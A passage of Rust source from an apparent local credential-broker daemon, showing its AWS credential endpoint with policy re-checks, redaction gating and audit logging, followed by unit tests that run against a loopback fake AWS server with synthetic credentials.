        g.check_endpoint(id)?;
        let endpoint_caller = ep.caller.clone();
        let sso = ep.sso.clone();
        let binding = ep.binding.clone();
        let launch = ep.launch.clone();
        let unredacted = ep.unredacted;
        let profile = ep.profile.clone();
        let fixed = if sso.is_none() { Some(crate::aws::AwsCreds::from_json(ep.creds.as_bytes())?) } else { None };
        drop(g);
        check_agent_access(p, st, &endpoint_caller)?;
        if let Some(reason) = endpoint_policy_denial(p, st, id, &endpoint_caller, &profile)? {
            return reply_policy_denied(&mut c, reason);
        }
        let (creds, exp) = match (sso.as_deref(), fixed) {
            // SSO: fresh role creds; real expiry (minus a margin) so the SDK re-fetches in time.
            (Some(name), _) => match sso_fresh_creds_bound(st, p, name, binding.as_ref().context("missing SSO binding")?) {
                // Tell the SDK to come back before our cache margin, and by the portal's
                // sign-in limit (so a running command stops then too), never sooner than 30 s.
                Ok((minted, e, limit)) => {
                    // A launch owner's output filter must know these values before the target does.
                    // An approved --no-redact launch has no filter to inform, so skip the feed for
                    // the endpoint's lifetime; any other launch needs it (and fails closed without).
                    if let Some(launch) = launch.as_ref().filter(|_| !unredacted) && let Err(e) = redact_before_serving(st, launch, name, &minted) {
                        let msg = json!({"code": "CredentialsUnavailable", "message": format!("{e:#}")}).to_string();
                        reply(&mut c, "503 Service Unavailable", &msg)?;
                        return Ok(());
                    }
                    let t = e.saturating_sub(margin(now(), e, 300));
                    (minted, iso8601(limit.map_or(t, |l| t.min(l)).max(now() + 30)))
                }
                Err(e) => {
                    let msg = json!({"code": "CredentialsUnavailable", "message": format!("{e:#}")}).to_string();
                    reply(&mut c, "503 Service Unavailable", &msg)?;
                    return Ok(());
                }
            },
            // Pasted keys: the endpoint's own lifetime caps how long the SDK caches it.
            (None, Some(c)) => (c, iso8601(now() + 15 * 60)),
            (None, None) => unreachable!(),
        };
        let body = Zeroizing::new(
            json!({
                "AccessKeyId": creds.access_key_id,
                "SecretAccessKey": creds.secret_access_key,
                "Token": creds.session_token,
                "Expiration": exp,
            })
            .to_string(),
        );
        #[cfg(test)]
        sso_test_checkpoint("http-commit");
        // This check is the response linearization point. Writes cannot block containment.
        {
            let g = st.lock().unwrap();
            g.check_endpoint(id)?;
            if let (Some(name), Some(binding)) = (&sso, &binding) { g.check_binding(name, binding)?; }
        }
        check_agent_access(p, st, &endpoint_caller)?;
        if let Some(reason) = endpoint_policy_denial(p, st, id, &endpoint_caller, &profile)? {
            return reply_policy_denied(&mut c, reason);
        }
        reply(&mut c, "200 OK", &body)?;
        Ok(())
    })
}

/// Policy rules can change while a job runs. Re-evaluate the launch-time `run` rule against
/// the current config on every fetch; only a deny revokes (an approve was given at launch
/// and is never prompted for again). A deny ends the endpoint, so retries get 404.
fn endpoint_policy_denial(p: &Paths, st: &Mutex<State>, id: &str, caller: &agent::Caller, profile: &str) -> Result<Option<&'static str>> {
    let Some(policy) = store::load_config(p)?.policy else { return Ok(None) };
    // Legacy endpoints may store the bare profile name; policy subjects use the entry name.
    let entry = if profile.starts_with("aws/") { profile.to_string() } else { format!("aws/{profile}") };
    let subject = crate::policy::Subject::Secret(entry);
    let decision = crate::policy::evaluate(&policy, caller, crate::policy::Action::Run, &subject);
    if decision.effect != crate::policy::Effect::Deny { return Ok(None); }
    // Containment first: nothing blocking (audit) may delay taking access away.
    {
        let mut g = st.lock().unwrap();
        g.aws.remove(id);
        g.reconcile_launch_endpoints();
    }
    let result = Err(anyhow!(decision.reason));
    let _ = crate::audit::log(p, crate::audit::Event { action: "policy-decision", secrets: &[], caller,
        detail: json!({"action": crate::policy::Action::Run, "subject": subject, "effect": decision.effect,
            "reason_code": decision.reason, "when": "aws-credential-fetch"}), result: &result });
    audit_bound_containment(p, st);
    Ok(Some(decision.reason))
}

fn reply_policy_denied(c: &mut TcpStream, reason: &str) -> Result<()> {
    let body = json!({"code": "PolicyDenied", "message": format!("AWS access denied by policy ({reason})"), "reason": reason}).to_string();
    write!(c, "HTTP/1.1 403 Forbidden\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{body}", body.len())?;
    Ok(())
}

fn iso8601(ts: u64) -> String {
    let t = ts as libc::time_t;
    let mut tm: libc::tm = unsafe { std::mem::zeroed() };
    unsafe { libc::gmtime_r(&t, &mut tm) };
    format!("{:04}-{:02}-{:02}T{:02}:{:02}:{:02}Z", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec)
}

/// Is a daemon process alive (socket answers)?
pub fn running(p: &Path) -> bool {
    UnixStream::connect(p.join("run").join(SOCK)).is_ok()
}

/// SSO sign-in lifecycle against a fake AWS (OIDC + portal) on loopback. Debug builds
/// only (release builds never talk to anything but real AWS).
#[cfg(all(test, debug_assertions))]
mod tests {
    use super::*;
    use crate::sso::{Session, SessionEnded, SsoProfile, SsoReg};
    use std::collections::VecDeque;

    /// Scripted replies; an empty queue means success.
    #[derive(Default)]
    struct Fake {
        token: VecDeque<(u16, &'static str)>,
        creds: VecDeque<u16>,
        token_calls: usize,
        creds_calls: usize,
    }

    fn fake_aws(f: Arc<Mutex<Fake>>) -> String {
        let l = TcpListener::bind("127.0.0.1:0").unwrap();
        let base = format!("http://{}", l.local_addr().unwrap());
        std::thread::spawn(move || {
            for c in l.incoming() {
                let Ok(mut c) = c else { continue };
                let mut r = BufReader::new(c.try_clone().unwrap());
                let mut line = String::new();
                r.read_line(&mut line).unwrap();
                let path = line.split_whitespace().nth(1).unwrap_or("").to_string();
                let mut len = 0usize;
                loop {
                    let mut h = String::new();
                    r.read_line(&mut h).unwrap();
                    if h.trim().is_empty() {
                        break;
                    }
                    if let Some(v) = h.to_ascii_lowercase().strip_prefix("content-length:") {
                        len = v.trim().parse().unwrap_or(0);
                    }
                }
                let mut body = vec![0; len];
                r.read_exact(&mut body).unwrap();
                let (code, out) = {
                    let mut f = f.lock().unwrap();
                    if path == "/token" {
                        f.token_calls += 1;
                        let n = f.token_calls;
                        match f.token.pop_front() {
                            Some((code, body)) => (code, body.to_string()),
                            None => (200, format!(r#"{{"accessToken":"AT-{n}","expiresIn":3600,"refreshToken":"RT-{n}"}}"#)),
                        }
                    } else if path.starts_with("/federation/credentials") {
                        f.creds_calls += 1;
                        match f.creds.pop_front().unwrap_or(200) {
                            200 => (
                                200,
                                format!(
                                    r#"{{"roleCredentials":{{"accessKeyId":"ASIAFAKEFAKEFAKE","secretAccessKey":"fake","sessionToken":"fake","expiration":{}}}}}"#,
                                    (now() + 3600) * 1000
                                ),
                            ),
                            code => (code, r#"{"message":"Session token not found or invalid"}"#.to_string()),
                        }
                    } else {
                        (404, "{}".to_string())
                    }
                };
                let _ = write!(c, "HTTP/1.1 {code} X\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{out}", out.len());
            }
        });
        base
    }

    pub(super) fn launch_fake_aws(fail: bool) -> String {
        let mut fake = Fake::default();
        if fail { fake.creds.push_back(500); }
        fake_aws(Arc::new(Mutex::new(fake)))
    }

    pub(super) fn session(cid: &str, expires_in: u64, renew_until: Option<u64>) -> Session {
        let t = now();
        Session {
            portal: "main".into(),
            start_url: "https://acme.awsapps.com/start".into(),
            region: "us-west-2".into(),
            client_id: cid.into(),
            client_secret: "csec".into(),
            client_expires_at: t + 86400,
            access_token: "AT-0".into(),
            access_issued_at: t - 600,
            access_expires_at: t + expires_in,
            refresh_token: Some("RT-0".into()),
            signed_in_at: t - 600,
            renew_until,
        }
    }

    fn state_with(s: Session) -> Ctx {
        let reg = SsoReg {
            name: "aws/x".into(),
            profile: SsoProfile {
                portal: "main".into(),
                start_url: s.start_url.clone(),
                sso_region: s.region.clone(),
                account_id: "111111111111".into(),
                role_name: "ReadOnly".into(),
                region: None,
            },
            tier: store::Tier::Open,
            agent_allowed: true,
            dek_sha256: None,
        };
        let mut g = State::default();
        g.sso.insert("main".into(), s);
        g.sso_profiles.insert("aws/x".into(), reg);
        Ctx::new(g)
    }

    fn proof_fixture(label: &str) -> (Paths, Arc<Ctx>) {
        let p = Paths { root: std::env::temp_dir().join(format!("karambit-sso-proof-{label}-{}", std::process::id())) };
        let _ = std::fs::remove_dir_all(&p.root);
        let cfg = store::Config {
            agent_process_names: vec![], agent_env_markers: vec![],
            removed_defaults: store::DEFAULT_AGENT_PROCESS_NAMES.iter().chain(store::DEFAULT_AGENT_ENV_MARKERS).map(|s| s.to_string()).collect(),
            ..Default::default()
        };
        store::save_config(&p, &cfg).unwrap();
        (p, Arc::new(state_with(session("proof", 3600, None))))
    }

    fn cache_synthetic_creds(st: &Mutex<State>) {
        let mut g = st.lock().unwrap();
        let binding = g.binding("aws/x").unwrap();
        g.sso_creds.insert("aws/x".into(), SsoCreds {
            creds: Zeroizing::new(r#"{"access_key_id":"SYNTHETIC","secret_access_key":"synthetic","session_token":"synthetic","region":"us-west-2"}"#.into()),
            issued: now(), expires_at: now() + 3600, binding,
        });
    }

    fn open_request(dek: Option<String>) -> Req { Req::SsoOpen { name: "aws/x".into(), dek, ttl: 60 } }

    fn no_auth() {
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("unexpected authentication"))));
    }

    fn clear_hooks() {
        crate::platform::helper::AUTH_HOOK.with(|h| { h.borrow_mut().take(); });
        SSO_TEST_HOOK.with(|h| { h.borrow_mut().take(); });
    }

    #[test]
    fn sso_proof_smoke_changed_binding_bio_reuse_and_legacy_open() {
        let (p, st) = proof_fixture("smoke");
        let me = std::process::id() as i32;
        let mut reg = st.lock().unwrap().sso_profiles["aws/x"].clone();
        reg.tier = store::Tier::Bio;
        reg.dek_sha256 = Some(crate::sso::sha256_hex(&[7; 32]));
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
        handle(&p, &st, me, Req::SsoRegister { profiles: vec![reg] }, 0).unwrap();
        cache_synthetic_creds(&st);
        no_auth();
        let ep = handle(&p, &st, me, open_request(Some(B64.encode([7; 32]))), 0).unwrap();
        assert!(st.lock().unwrap().check_endpoint(ep["id"].as_str().unwrap()).is_ok());
        // Legacy Open human-only has a separate fresh gate, regardless of cached creds.
        {
            let mut g = st.lock().unwrap();
            let r = g.sso_profiles.get_mut("aws/x").unwrap();
            r.tier = store::Tier::Open; r.agent_allowed = false; r.dek_sha256 = None;
            g.invalidate_registration("aws/x");
        }
        cache_synthetic_creds(&st);
        let calls = std::rc::Rc::new(std::cell::Cell::new(0));
        let count = calls.clone();
        let state = st.clone();
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || {
            assert!(state.try_lock().is_ok(), "no mutex across auth");
            count.set(count.get() + 1); Ok(())
        })));
        handle(&p, &st, me, open_request(None), 0).unwrap();
        assert_eq!(calls.get(), 1);
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn run_unlock_opens_sso_internally_without_returning_dek() {
        use p256::elliptic_curve::sec1::ToEncodedPoint;
        let (p, st) = proof_fixture("run-unlock");
        store::ensure_dir(&p.keys()).unwrap();
        for key in ["bio.key", "open.key"] { std::fs::write(p.keys().join(key), b"synthetic").unwrap(); }
        let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
        let pk = B64.encode(sk.public_key().to_encoded_point(false).as_bytes());
        store::write_atomic(&p.pubkeys(), &serde_json::to_vec(&json!({"bio":pk,"open":pk})).unwrap()).unwrap();
        let dek = crate::crypto::new_dek();
        let profile = {
            let mut g = st.lock().unwrap();
            let reg = g.sso_profiles.get_mut("aws/x").unwrap();
            reg.tier = store::Tier::Bio;
            reg.dek_sha256 = Some(crate::sso::sha256_hex(dek.as_ref()));
            reg.profile.clone()
        };
        let v = peer_vault(&p, &agent::Peer::default()).unwrap();
        let f = v.build_file("aws/x", store::Tier::Bio, true, false, &dek,
            &serde_json::to_vec(&json!({"sso":profile})).unwrap(), &v.pubkeys_local().unwrap(), None).unwrap();
        store::save_secret(&p, &f).unwrap();
        // Registration and login completion derive policy/binding from this envelope,
        // not a client-asserted registration. The network token is synthetic.
        let mut cfg = store::load_config(&p).unwrap();
        cfg.sso_portals.insert("main".into(), store::SsoPortal {
            start_url: profile.start_url.clone(), region: profile.sso_region.clone(), limit_minutes: Some(15), accounts: Default::default() });
        store::save_config(&p, &cfg).unwrap();
        for login in [false, true] {
            crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|requests| {
                let sk = p256::SecretKey::from_slice(&[7;32]).unwrap();
                requests.iter().map(|(_, eph)| {
                    let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                    Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
                }).collect()
            })));
            crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(()))));
            let req = if login { Req::CompleteSsoLogin { session: session("synthetic-login", 3600, None) } }
                else { Req::RefreshSsoRegistrations { names: vec!["aws/x".into()] } };
            handle_as(&p, &st, agent::Peer::default(), req, 1234, None, Ok).unwrap();
            let g = st.lock().unwrap();
            let r = &g.sso_profiles["aws/x"];
            assert_eq!(r.dek_sha256.as_deref(), Some(crate::sso::sha256_hex(dek.as_ref()).as_str()));
            assert_eq!(r.profile, profile);
            assert_eq!(r.tier, f.tier);
            assert_eq!(r.agent_allowed, f.agent_allowed);
            if login { assert_eq!(g.sso["main"].renew_until, Some(g.sso["main"].signed_in_at + 900)); }
        }
        cache_synthetic_creds(&st);
        no_auth();
        crate::platform::helper::ECDH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move |requests| {
            requests.iter().map(|(_, eph)| {
                let pk = p256::PublicKey::from_sec1_bytes(&B64.decode(eph)?)?;
                Ok(Zeroizing::new(p256::ecdh::diffie_hellman(sk.to_nonzero_scalar(), pk.as_affine()).raw_secret_bytes().to_vec()))
            }).collect()
        })));
        let r = handle_as(&p, &st, agent::Peer::default(), Req::Unlock {
            names: vec!["aws/x".into()], action: UnlockAction::Run, context: None, cmd: Some("fixture".into()),
            gate_open: false, sso_profile: Some("aws/x".into()), ttl: 60,
        }, 1234, None, Ok).unwrap();
        assert!(r["endpoint"]["url"].as_str().unwrap().starts_with("http://127.0.0.1:1234/"));
        assert!(st.lock().unwrap().check_endpoint(r["endpoint"]["id"].as_str().unwrap()).is_ok());
        assert!(!r.to_string().contains("dek"));
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        for action in ["daemon-unlock", "run", "daemon-sso-open"] {
            assert!(events.iter().any(|e| e["action"] == action && e["phase"] == "intent"));
            assert!(events.iter().any(|e| e["action"] == action && e["phase"] == "outcome" && e["ok"] == true));
        }
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn sso_register_changed_hash_refusal_and_invalid_bio_are_atomic() {
        let (p, st) = proof_fixture("hash");
        let me = std::process::id() as i32;
        let hash = crate::sso::sha256_hex(&[1; 32]);
        for (old, new) in [(None, Some(hash.clone())), (Some(hash.clone()), Some(crate::sso::sha256_hex(&[2; 32]))), (Some(hash.clone()), None)] {
            st.lock().unwrap().sso_profiles.get_mut("aws/x").unwrap().dek_sha256 = old.clone();
            cache_synthetic_creds(&st);
            let mut reg = st.lock().unwrap().sso_profiles["aws/x"].clone(); reg.dek_sha256 = new;
            let calls = std::rc::Rc::new(std::cell::Cell::new(0)); let count = calls.clone();
            crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { count.set(count.get() + 1); bail!("auth refused") })));
            let err = handle(&p, &st, me, Req::SsoRegister { profiles: vec![reg] }, 0).unwrap_err();
            assert!(err.to_string().contains("auth refused")); assert_eq!(calls.get(), 1);
            let g = st.lock().unwrap();
            assert_eq!(g.sso_profiles["aws/x"].dek_sha256, old);
            assert!(g.sso_creds.contains_key("aws/x")); assert_eq!(g.registration_revision("aws/x"), 0);
        }
        for hash in [None, Some("bad".into()), Some("g".repeat(64))] {
            no_auth();
            let mut reg = st.lock().unwrap().sso_profiles["aws/x"].clone(); reg.tier = store::Tier::Bio; reg.dek_sha256 = hash;
            assert!(handle(&p, &st, me, Req::SsoRegister { profiles: vec![reg] }, 0).unwrap_err().to_string().contains("valid SHA-256"));
        }
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn sso_register_refuses_a_widening_list_the_prompt_would_cut() {
        let (p, st) = proof_fixture("register-long");
        let me = std::process::id() as i32;
        let base = st.lock().unwrap().sso_profiles["aws/x"].clone();
        let profiles: Vec<_> = (0..4).map(|i| { let mut r = base.clone(); r.name = format!("aws/long-profile-{i}"); r }).collect();
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| panic!("no prompt for a list that does not fit"))));
        let error = handle(&p, &st, me, Req::SsoRegister { profiles }, 0).unwrap_err().to_string();
        assert!(error.contains("too many profiles for one prompt"), "{error}");
        assert!(!st.lock().unwrap().sso_profiles.contains_key("aws/long-profile-0"));
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn sso_register_rejects_stale_classification_including_no_prompt_and_session_aba() {
        for mode in ["same", "tightening", "authenticated", "session"] {
            let (p, st) = proof_fixture(mode);
            let mut reg = st.lock().unwrap().sso_profiles["aws/x"].clone();
            if mode == "tightening" { reg.agent_allowed = false; }
            if mode == "authenticated" { reg.profile.role_name = "Admin".into(); }
            let state = st.clone();
            let change = move || {
                let mut g = state.try_lock().expect("snapshot must release mutex");
                if mode == "session" {
                    // Same caller-supplied client ID/timestamp is still a new sign-in.
                    g.invalidate_session("main");
                } else {
                    g.invalidate_registration("aws/x");
                    g.sso_profiles.remove("aws/x");
                }
            };
            if mode == "authenticated" {
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { change(); Ok(()) })));
            } else {
                no_auth();
                SSO_TEST_HOOK.with(|h| *h.borrow_mut() = Some(("register-commit", Box::new(change))));
            }
            let e = handle(&p, &st, std::process::id() as i32, Req::SsoRegister { profiles: vec![reg] }, 0).unwrap_err();
            assert!(e.to_string().contains("changed; retry"), "{mode}: {e:#}");
            if mode != "session" { assert!(!st.lock().unwrap().sso_profiles.contains_key("aws/x")); }
            clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
        }
    }

    /// Wire up a launch-bound endpoint with a live redaction feed; returns the owner's redactor.
    fn feed_fixture(p: &Paths, st: &Arc<Ctx>, ep: &Value, owner_acks: bool) -> (std::thread::JoinHandle<()>, Arc<crate::redact::Redactor>, UnixStream) {
        {
            let mut g = st.lock().unwrap();
            g.aws.get_mut(ep["id"].as_str().unwrap()).unwrap().launch = Some("L1".into());
            g.redaction_feeds.insert("L1".into(), RedactionFeed::default());
        }
        let (mut daemon_end, owner_end) = UnixStream::pair().unwrap();
        let (p, st) = (p.clone(), st.clone());
        let feed = std::thread::spawn(move || serve_redaction_feed(&p, &st, &mut daemon_end, "L1", &|_| true));
        let redactor = Arc::new(crate::redact::Redactor::new(&[]));
        if owner_acks {
            let (stream, red) = (owner_end.try_clone().unwrap(), redactor.clone());
            std::thread::spawn(move || crate::shim::learn_redactions(stream, &red));
        }
        (feed, redactor, owner_end)
    }

    #[test]
    fn launch_endpoint_serves_role_credentials_only_after_owner_learned_them() {
        let (p, st) = proof_fixture("feed");
        cache_synthetic_creds(&st); no_auth();
        let ep = handle(&p, &st, std::process::id() as i32, open_request(None), 0).unwrap();
        let (feed, redactor, owner_end) = feed_fixture(&p, &st, &ep, true);
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 200"), "{response}");
        // The ack precedes the reply, so the owner's filter already knows every secret part.
        let mut seen = b"a SYNTHETIC b synthetic c".to_vec();
        let out = String::from_utf8(redactor.process(&mut seen, true)).unwrap();
        assert!(out.contains("[REDACTED:aws/x:access-key-id]") && !out.contains("SYNTHETIC") && !out.contains("synthetic"), "{out}");
        // Same credentials again need no new round trip.
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 200"));
        // Owner leaving ends the feed and the launch's endpoint authority.
        owner_end.shutdown(std::net::Shutdown::Both).unwrap(); feed.join().unwrap();
        assert!(st.lock().unwrap().redaction_feeds.is_empty());
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn launch_endpoint_never_serves_role_credentials_the_owner_did_not_acknowledge() {
        let (p, st) = proof_fixture("feed-silent");
        cache_synthetic_creds(&st); no_auth();
        let ep = handle(&p, &st, std::process::id() as i32, open_request(None), 0).unwrap();
        let (feed, _redactor, owner_end) = feed_fixture(&p, &st, &ep, false);
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap();
        assert!(response.starts_with("HTTP/1.1 503"), "{response}");
        assert!(!response.contains("SYNTHETIC") && !response.contains("synthetic"), "{response}");
        owner_end.shutdown(std::net::Shutdown::Both).unwrap(); feed.join().unwrap();
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn launch_endpoint_fetch_after_feed_ended_is_not_served() {
        let (p, st) = proof_fixture("feed-ended");
        cache_synthetic_creds(&st); no_auth();
        let ep = handle(&p, &st, std::process::id() as i32, open_request(None), 0).unwrap();
        let (feed, _redactor, owner_end) = feed_fixture(&p, &st, &ep, true);
        owner_end.shutdown(std::net::Shutdown::Both).unwrap(); feed.join().unwrap();
        // Containment removed the launch's delivered record; here only the feed is gone, which must
        // still stop the commit-time check from serving (feed absent + launch set = no filter).
        // Frame taken, feed gone: no filter remains, so nothing is served (a delivered launch's
        // endpoint is already removed by the feed's exit; this covers a fetch racing that removal).
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap();
        assert!(response.starts_with("HTTP/1.1 503") && !response.contains("SYNTHETIC"), "{response}");
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    fn deny_run_policy(p: &Paths, effect: crate::policy::Effect) {
        let mut cfg = store::load_config(p).unwrap();
        cfg.policy = Some(crate::policy::Policy {
            rules: vec![crate::policy::Rule { subject: crate::policy::Subject::Secret("aws/*".into()), action: crate::policy::Action::Run,
                who: crate::policy::Who::Any, effect }],
            tags: Default::default(),
        });
        store::save_config(p, &cfg).unwrap();
    }

    #[test]
    fn new_policy_deny_ends_running_aws_endpoint_on_next_fetch() {
        let (p, st) = proof_fixture("policy-deny");
        let me = std::process::id() as i32;
        cache_synthetic_creds(&st); no_auth();
        let ep = handle(&p, &st, me, open_request(None), 0).unwrap();
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 200"));
        // An approve rule never prompts on fetch: the launch already carried the approval.
        deny_run_policy(&p, crate::policy::Effect::Approve);
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 200"), "{response}");
        deny_run_policy(&p, crate::policy::Effect::Deny);
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap();
        assert!(response.starts_with("HTTP/1.1 403"), "{response}");
        assert!(response.contains("policy.rule_deny") && !response.contains("SYNTHETIC"), "{response}");
        assert!(st.lock().unwrap().aws.is_empty(), "denied endpoint must be removed");
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        assert!(events.iter().any(|e| e["action"] == "policy-decision" && e["detail"]["when"] == "aws-credential-fetch" && e["detail"]["effect"] == "deny"));
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 404"), "{response}");
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn new_policy_deny_ends_legacy_static_aws_endpoint() {
        let (p, st) = proof_fixture("policy-deny-static");
        let creds = r#"{"access_key_id":"AKIASYNTHETIC","secret_access_key":"synthetic-secret","session_token":"synthetic-token"}"#;
        let ep = handle(&p, &st, std::process::id() as i32, Req::AwsOpen { profile: "prod".into(), creds: creds.into(), ttl: 60 }, 0).unwrap();
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 200"), "{response}");
        deny_run_policy(&p, crate::policy::Effect::Deny);
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap();
        assert!(response.starts_with("HTTP/1.1 403") && !response.contains("synthetic"), "{response}");
        assert!(st.lock().unwrap().aws.is_empty());
        std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn sso_open_refused_auth_and_malformed_bio_never_acquire_or_disclose() {
        let (p, st) = proof_fixture("open-refuse");
        st.lock().unwrap().sso_profiles.get_mut("aws/x").unwrap().agent_allowed = false;
        let me = std::process::id() as i32;
        crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| bail!("auth refused"))));
        assert!(handle(&p, &st, me, open_request(None), 0).unwrap_err().to_string().contains("auth refused"));
        no_auth();
        st.lock().unwrap().sso_profiles.get_mut("aws/x").unwrap().tier = store::Tier::Bio;
        assert!(handle(&p, &st, me, open_request(None), 0).unwrap_err().to_string().contains("valid SHA-256"));
        let g = st.lock().unwrap(); assert!(g.aws.is_empty() && g.sso_creds.is_empty()); drop(g);
        let events = crate::audit::read(&p, usize::MAX).unwrap();
        assert!(!events.iter().any(|v| v["action"] == "sso_fresh_creds"));
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn sso_new_gates_intent_failure_means_zero_auth_calls() {
        let (p, st) = proof_fixture("intent");
        st.lock().unwrap().sso_profiles.get_mut("aws/x").unwrap().agent_allowed = false;
        let mut reg = st.lock().unwrap().sso_profiles["aws/x"].clone(); reg.dek_sha256 = Some(crate::sso::sha256_hex(&[3; 32]));
        no_auth(); crate::audit::fail_phase(Some("intent"));
        for req in [open_request(None), Req::SsoRegister { profiles: vec![reg] }] {
            assert!(handle(&p, &st, std::process::id() as i32, req, 0).unwrap_err().to_string().contains("audit intent"));
        }
        crate::audit::fail_phase(None);
        let g = st.lock().unwrap();
        assert!(g.aws.is_empty() && g.sso_creds.is_empty()); assert!(g.sso_profiles["aws/x"].dek_sha256.is_none()); drop(g);
        clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
    }

    #[test]
    fn sso_open_revalidates_all_proof_branches_before_commit() {
        for mode in ["bio", "bio-delivery", "open", "legacy-prompt", "legacy-commit"] {
            let (p, st) = proof_fixture(mode);
            let dek = if mode.starts_with("bio") {
                let mut g = st.lock().unwrap(); let r = g.sso_profiles.get_mut("aws/x").unwrap();
                r.tier = store::Tier::Bio; r.dek_sha256 = Some(crate::sso::sha256_hex(&[4; 32]));
                Some(B64.encode([4; 32]))
            } else { None };
            if mode.starts_with("legacy") { st.lock().unwrap().sso_profiles.get_mut("aws/x").unwrap().agent_allowed = false; }
            cache_synthetic_creds(&st);
            let state = st.clone();
            let change = move || { state.try_lock().unwrap().invalidate_registration("aws/x"); };
            if mode == "legacy-prompt" {
                crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(move || { change(); Ok(()) })));
            } else {
                if mode == "legacy-commit" { crate::platform::helper::AUTH_HOOK.with(|h| *h.borrow_mut() = Some(Box::new(|| Ok(())))); } else { no_auth(); }
                let point = if mode == "bio-delivery" { "open-delivery" } else { "open-commit" };
                SSO_TEST_HOOK.with(|h| *h.borrow_mut() = Some((point, Box::new(change))));
            }
            let e = handle_correlated(&p, &st, std::process::id() as i32, open_request(dek), 0, None, |_| panic!("stale response delivered")).unwrap_err();
            assert!(e.to_string().contains("changed; retry") || e.to_string().contains("endpoint ended"), "{e:#}");
            assert!(st.lock().unwrap().aws.is_empty());
            clear_hooks(); std::fs::remove_dir_all(p.root).unwrap();
        }
    }

    pub(super) fn http_endpoint(p: &Paths, st: &Mutex<State>, ep: &Value) -> (Result<()>, String) {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let mut client = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
        client.set_read_timeout(Some(Duration::from_secs(2))).unwrap();
        write!(client, "GET /creds/{} HTTP/1.1\r\nAuthorization: {}\r\n\r\n", ep["id"].as_str().unwrap(), ep["token"].as_str().unwrap()).unwrap();
        let (server, _) = listener.accept().unwrap();
        let result = serve_aws(server, st, p);
        let mut response = String::new(); client.read_to_string(&mut response).unwrap();
        (result, response)
    }

    #[test]
    fn sso_endpoint_replacement_and_response_linearization() {
        let (p, st) = proof_fixture("endpoint");
        let me = std::process::id() as i32;
        cache_synthetic_creds(&st); no_auth();
        let ep = handle(&p, &st, me, open_request(None), 0).unwrap();
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 200"));
        let state = st.clone();
        SSO_TEST_HOOK.with(|h| *h.borrow_mut() = Some(("http-commit", Box::new(move || state.lock().unwrap().invalidate_registration("aws/x")))));
        let (result, response) = http_endpoint(&p, &st, &ep);
        assert!(result.is_err()); assert!(response.is_empty(), "stale acquired credentials must not be delivered");
        cache_synthetic_creds(&st);
        let ep = handle_correlated(&p, &st, me, open_request(None), 0, None, |response| {
            // Replacement AFTER the response commit is ordered after that delivery.
            let mut reg = st.lock().unwrap().sso_profiles["aws/x"].clone(); reg.agent_allowed = false;
            handle(&p, &st, me, Req::SsoRegister { profiles: vec![reg] }, 0).unwrap();
            Ok(response)
        }).unwrap();
        let (result, response) = http_endpoint(&p, &st, &ep);
        result.unwrap(); assert!(response.starts_with("HTTP/1.1 404")); assert!(!response.contains("SYNTHETIC"));
        assert!(st.lock().unwrap().sso_creds.is_empty());
        // Session replacement also invalidates endpoints, even reusing all client fields.
